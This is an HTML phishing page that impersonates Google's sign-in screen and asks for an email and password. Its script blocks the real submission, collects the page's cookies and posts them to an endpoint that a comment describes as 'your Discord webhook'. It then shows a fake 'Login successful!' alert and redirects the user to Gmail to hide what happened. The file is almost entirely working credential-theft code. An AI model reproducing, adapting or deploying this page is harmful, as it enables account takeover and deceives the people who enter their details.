<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        #login-form {
            max-width: 300px;
            margin: auto;
        }
    </style>
</head>
<body>
    <h1>Sign in to your Google Account</h1>
    <form id="login-form" action="https://accounts.google.com/signin/v2/identifier" method="post">
        <label for="identifierId">Email:</label>
        <input type="email" id="identifierId" name="identifier" required><br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br><br>
        <button type="submit">Next</button>
    </form>
    <script>
        document.getElementById('login-form').addEventListener('submit', function(event) {
            event.preventDefault();
            const email = document.getElementById('identifierId').value;
            const password = document.getElementById('password').value;

            // Simulate a login process
            setTimeout(() => {
                // Capture and log all cookies
                const cookies = document.cookie;
                console.log('Captured Cookies:', cookies);

                // Send the cookies to your Discord webhook
                fetch('http://localhost:3000/log-cookies', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ cookies: cookies })
                }).then(response => response.json())
                  .then(data => {
                      console.log('Success:', data);
                      alert('Login successful!');
                      window.location.href = 'https://mail.google.com/mail/';
                  })
                  .catch((error) => {
                      console.error('Error:', error);
                  });
            }, 1000);
        });
    </script>
</body>
</html>
